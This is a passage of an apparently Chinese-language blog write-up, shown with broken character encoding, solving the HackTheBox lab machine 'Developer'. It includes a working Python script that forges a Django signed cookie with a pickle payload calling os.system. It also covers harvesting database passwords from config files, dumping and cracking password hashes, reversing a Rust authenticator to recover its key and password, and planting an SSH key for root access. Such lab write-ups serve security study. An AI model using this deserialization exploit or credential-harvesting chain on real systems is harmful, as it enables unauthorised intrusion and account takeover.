href=\"https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a></p>\n<p>é‡Œè¾¹æœ‰ä¸€ä¸ª<code>POC</code> ï¼Œä¼šè®©ç³»ç»Ÿç¡<code>30</code>ç§’</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python</span>\nimport django.core.signing, django.contrib.sessions.serializers\nfrom django.http import HttpResponse\nimport cPickle\nimport os\n\nSECRET_KEY=<span class=\"hljs-string\">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span>\n<span class=\"hljs-comment\">#Initial cookie I had on sentry when trying to reset a password</span>\ncookie=<span class=\"hljs-string\">'.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'</span>\nnewContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class=\"hljs-string\">'django.contrib.sessions.backends.signed_cookies'</span>)\nclass PickleRce(object):\n    def __reduce__(self):\n        <span class=\"hljs-built_in\">return</span> (os.system,(<span class=\"hljs-string\">\"sleep 30\"</span>,))\nnewContent[<span class=\"hljs-string\">'testcookie'</span>] = PickleRce()\n\n<span class=\"hljs-built_in\">print</span> django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class=\"hljs-string\">'django.contrib.sessions.backends.signed_cookies'</span>,compress=True)\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Developer python2 POC.py     \n.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s\n</code></pre>\n<p>äº‹å®è¯æ˜ï¼Œæ›¿æ¢äº†<code>Cookie</code>åï¼Œç¡®å®åŠ è½½äº†<code>30</code>ç§’</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image23.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬å°è¯•è®©å…¶<code>curl</code>æˆ‘ä»¬çš„æœåŠ¡å™¨</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image24.png\" alt=\"image.png\"></p>\n<p>è¿›è¡Œåå¼¹<code>Shell</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image25.png\" alt=\"image.png\"></p>\n<h2>In www-data Shell</h2>\n<p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢</p>\n<p>æœ‰ä¸¤ä¸ªç”¨æˆ·</p>\n<pre><code class=\"hljs language-bash\">www-data@developer:/var/sentry$ <span class=\"hljs-built_in\">ls</span> /home\n<span class=\"hljs-built_in\">ls</span> /home\nkarl\nmark\n</code></pre>\n<p>æ•°æ®é…ç½®æ–‡ä»¶å¯ä»¥åœ¨<code>/var/www/developer_ctf/developer_ctf/settings.py</code> ä¸­æ‰¾åˆ°</p>\n<pre><code class=\"hljs language-bash\">DATABASES = {                                            \n    <span class=\"hljs-string\">'default'</span>: {           \n        <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'django.db.backends.postgresql'</span>,       \n        <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'platform'</span>,             \n        <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'ctf_admin'</span>,  \n        <span class=\"hljs-string\">'PASSWORD'</span>: <span class=\"hljs-string\">'CTFOG2021'</span>,                         \n        <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,   \n        <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,    \n    }                                      \n}  \n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform\nPassword <span class=\"hljs-keyword\">for</span> user ctf_admin: \npsql (9.6.22)\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType <span class=\"hljs-string\">\"help\"</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>.\n\nplatform=> \n</code></pre>\n<p>è·å¾—ç”¨æˆ·ä¼¼ä¹éƒ½æ— æ•ˆ</p>\n<pre><code class=\"hljs language-bash\"> <span class=\"hljs-built_in\">id</span> |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          \n----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------\n  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7<span class=\"hljs-variable\">$7PrVwU5N1687BSxClTP0tlnFg</span>+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00\n  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A<span class=\"hljs-variable\">$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL</span>+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00\n  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb<span class=\"hljs-variable\">$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz</span>/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00\n  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN<span class=\"hljs-variable\">$4oL</span>+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00\n  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi<span class=\"hljs-variable\">$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4</span>= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00\n  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs<span class=\"hljs-variable\">$t9DwUfhd6jv8yiD7uih4HMgsKjrUg</span>/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00\n 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl<span class=\"hljs-variable\">$a4bFd9XH8FUfnZl</span>+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00\n  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf<span class=\"hljs-variable\">$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc</span>= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00\n</code></pre>\n<p>ç„¶ååœ¨<code>/etc/sentry/sentry.conf.py</code> åˆèƒ½æ‰¾åˆ°ä¸€ä¸ªæ•°æ®åº“å‡­æ®</p>\n<pre><code class=\"hljs language-bash\">    <span class=\"hljs-string\">'default'</span>: {\n        <span class=\"hljs-string\">'ENGINE'</span>: <span class=\"hljs-string\">'sentry.db.postgres'</span>,\n        <span class=\"hljs-string\">'NAME'</span>: <span class=\"hljs-string\">'sentry'</span>,                           \n        <span class=\"hljs-string\">'USER'</span>: <span class=\"hljs-string\">'sentry'</span>,\n        <span class=\"hljs-string\">'PASSWORD'</span>: <span class=\"hljs-string\">'SentryPassword2021'</span>,\n        <span class=\"hljs-string\">'HOST'</span>: <span class=\"hljs-string\">'localhost'</span>,\n        <span class=\"hljs-string\">'PORT'</span>: <span class=\"hljs-string\">''</span>,\n    }     \n}\n</code></pre>\n<p>è¿™æ¬¡èƒ½è·å¾—ä¸‰ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”<code>karl</code>æ˜¯æœ‰å®¶ç›®å½•çš„</p>\n<pre><code class=\"hljs language-bash\">sentry=#   \n<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">id</span>,username,password from auth_user;\n <span class=\"hljs-built_in\">id</span> |      username       |                                   password                                    \n----+---------------------+-------------------------------------------------------------------------------\n  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD<span class=\"hljs-variable\">$TTeyAB7uJ9uQprnr</span>+mgRb8ZL8othIs32aGmqahx1rGI=\n  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY<span class=\"hljs-variable\">$8aNutC5bwrU65AtpuvspwEicUw2</span>+63EQ61zjTyzVViE=\n  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD<span class=\"hljs-variable\">$MeYgWqZffc6tBixWGwXX2NTf</span>/0jIG42ofI+W3vcUKts=\n(3 rows)\n</code></pre>\n<p>å°è¯•ç ´è§£å¯†ç </p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image26.png\" alt=\"image.png\"></p>\n<p>å¾—åˆ°å¯†ç ï¼š<code>insaneclownposse</code></p>\n<p>æˆåŠŸè¿›å…¥<code>Karl</code>ç”¨æˆ·<code>Shell</code>ä¸­ï¼Œè¯»å–<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">cat</span> user.txt\n77cc1a399155edc9a66dae47df32a834\n</code></pre>\n<h2>In Karl Shell - To Root</h2>\n<p><code>sudo</code>æƒé™</p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> karl: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> karl on developer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser karl may run the following commands on developer:\n    (ALL : ALL) /root/.auth/authenticator\n</code></pre>\n<p>æ‹‰å‡ºæ¥<code>IDA</code> ï¼Œ<code>rust</code> é€†å‘<code>+1</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image27.png\" alt=\"image.png\"></p>\n<p><code>main</code>ä¸­è¿˜æœ‰ä¸ª<code>authentication::main</code></p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  isize v4; // rdx\n  core::ops::<span class=\"hljs-keyword\">function</span>::_Fn&#x3C;()> v5; // rdi\n  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF\n\n  v4 = argc;\n  v7 = authentication::main::h453271f02403abaf;\n  v5.vtable = (usize (*)[3])&#x26;anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;\n  v5.pointer = (u8 *)&#x26;v7;\n  <span class=\"hljs-built_in\">return</span> std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);\n}\n</code></pre>\n<p>è¿›å…¥åˆ°<code>authentication::main</code> ï¼Œå‰è¾¹ä¸¤ä¸ª<code>print</code>æ˜¯æ‰“å°å‰ä¸¤æ¡ä¿¡æ¯</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image28.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image29.png\" alt=\"image.png\"></p>\n<p>å†ä¸‹é¢å°±æ˜¯åŠ å¯†çš„å‡½æ•°</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image30.png\" alt=\"image.png\"></p>\n<p><code>args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &#x26;v36, 16LL, &#x26;v37, 16LL);</code></p>\n<p>å‘Šè¯‰æˆ‘ä»¬ä½¿ç”¨<code>AES-CTR</code>è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”ä¼ å…¥äº†ä»å†…å­˜åœ°å€å†²ä¼ å…¥çš„ä¸¤ä¸ªå¸¸é‡<code>v36</code>å’Œ<code>v37</code> ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯<code>key</code>å’Œ<code>VI</code></p>\n<p>æˆ‘ä»¬ä»<code>v36</code> å’Œ <code>v37</code>ä¸­å°†å€¼å¤åˆ¶å‡ºæ¥</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image31.png\" alt=\"image.png\"></p>\n<p>è¿˜å› ä¸ºæ˜¯å°ç«¯æ˜¾ç¤ºçš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜è¦å¯¹å…¶è½¬æ¢ä¸€ä¸‹</p>\n<pre><code class=\"hljs language-bash\">D5F5F4BE3DD4209E6191795C3432E8A3\n6A812006DC5598A79A95D2D9E3591F76\n//\nA3E832345C7991619E20D43DBEF4F5D5\n761F59E3D9D2959AA79855DC0620816A\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image32.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬å°†åŠ å¯†å’Œè§£å¯†å‡½æ•°å‡†å¤‡å¥½</p>\n<p>å†åˆ°ä¸‹è¾¹ï¼ˆä»£ç å–‚ç»™<code>AI</code>ï¼‰ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜æ–‡é•¿åº¦æ˜¯å¦ç­‰äº<code>32</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">if</span> ( size[1] == 32\n    &#x26;&#x26; (ptr == (u8 *)v5\n     || _mm_movemask_epi8(\n          _mm_and_si128(\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + <span class=\"hljs-number\">1</span>), _mm_loadu_si128(v5 + <span class=\"hljs-number\">1</span>)),\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )\n  {\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image33.png\" alt=\"image.png\"></p>\n<p><code>ptr</code>Â (æˆ‘ä»¬çš„è§£å¯†ç»“æœ) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â <code>RAX</code>Â å¯„å­˜å™¨ã€‚<code>v5</code>Â (ç¨‹åºå†…ç½®çš„ç›®æ ‡æ˜æ–‡) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â <code>R15</code>Â å¯„å­˜å™¨ã€‚</p>\n<p>é€šè¿‡è°ƒè¯•ç¡®è®¤ä¸€ä¸‹</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b main\npwndbg> r\npwndbg> b *0x55555555b9b9\nBreakpoint 2 at 0x55555555b9b9\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s super secure login portal!\nEnter your password to access the super user:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //å› ä¸ºæœŸå¾…è§£å¯†åæ˜æ–‡é•¿åº¦æ˜¯32å› æ­¤è¾“å…¥32ä¸ªA\npwndbg> hexdump $rax 32 //è·å–RAXçš„å€¼\n+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  â”‚./...D..â”‚\\..k.i.\"â”‚\n+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  â”‚i....,..â”‚...K.WnDâ”‚\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Developer awk <span class=\"hljs-string\">'{for(i=3;i&#x3C;=18;i++) printf $i}'</span> rax\ned2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image34.png\" alt=\"image.png\"></p>\n<p>è§£å¯†æˆåŠŸï¼Œé‚£ä¹ˆ<code>R15</code>çš„å€¼åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„</p>\n<pre><code class=\"hljs language-bash\">pwndbg> hexdump <span class=\"hljs-variable\">$r15</span> 32\n+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 <span class=\"hljs-built_in\">fc</span> 5c 20 23  â”‚..%..j..â”‚x..X.\\.#â”‚\n+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  â”‚l.......â”‚...:.<span class=\"hljs-string\">'.,â”‚\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Developer awk <span class=\"hljs-string\">'{for(i=3;i&#x3C;=18;i++) printf $i}'</span> r15\nfe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image35.png\" alt=\"image.png\"></p>\n<p>å¾—åˆ°é‡ç‚¹<code>RustForSecurity@Developer@2021:)</code></p>\n<p>æˆ‘ä»¬åˆ°<code>karl</code>çš„<code>shell</code>ä¸­è¿è¡Œç¨‹åºï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬çš„å…¬é’¥</p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">sudo</span> /root/.auth/authenticator \n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> karl: \nWelcome to TheCyberGeek<span class=\"hljs-string\">'s super secure login portal!\nEnter your password to access the super user: \nRustForSecurity@Developer@2021:)\nYou have successfully authenticated\nEnter your SSH public key in now:\nssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali\nYou may now authenticate as root!\n</span></code></pre>\n<p>ç„¶åé€šè¿‡æˆ‘ä»¬çš„ç§é’¥å°±å¯ä»¥ç™»å½•åˆ°<code>root</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image36.png\" alt=\"image.png\"></p>\n<p>è¯»å– <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@developer:~# <span class=\"hljs-built_in\">cat</span> root.txt \n720b2e4080688fxxxxx\n</code></pre>\n<h2>æ€»ç»“</h2>\n<p>å¾ˆå¤šçš„çŸ¥è¯†ç›²åŒºï¼Œæˆ–è€…è¯´æ˜¯æˆ‘æ²¡è€å¿ƒï¼Œå¾ˆå¤šåœ°æ–¹éƒ½è¦çœ‹ä¸€ä¸‹WPæ‰èƒ½çŸ¥é“å¦‚ä½•èµ°ä¸‹å»</p>\n<p>æ€»çš„æ¥è¯´éš¾åº¦ä¸ªäººè€Œè¨€ <code>8/10</code> ï¼Œæ³ª</p>","title":"HackTheBox - Machine - Developer","date":"2025-06-22","updated":"2025-06-22","tags":["HackTheBox","Linux","CTF","Rrverse","Rust","Django","Tabanbbing","Crack"],"categories":"é¶æœº","comments":true},"recentPosts":[{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"ç¾¤Ué¶æœºTools","title":"ç¾¤Ué¶æœº - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - åŸºæœ¬ROP","title":"PWN - åŸºæœ¬ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}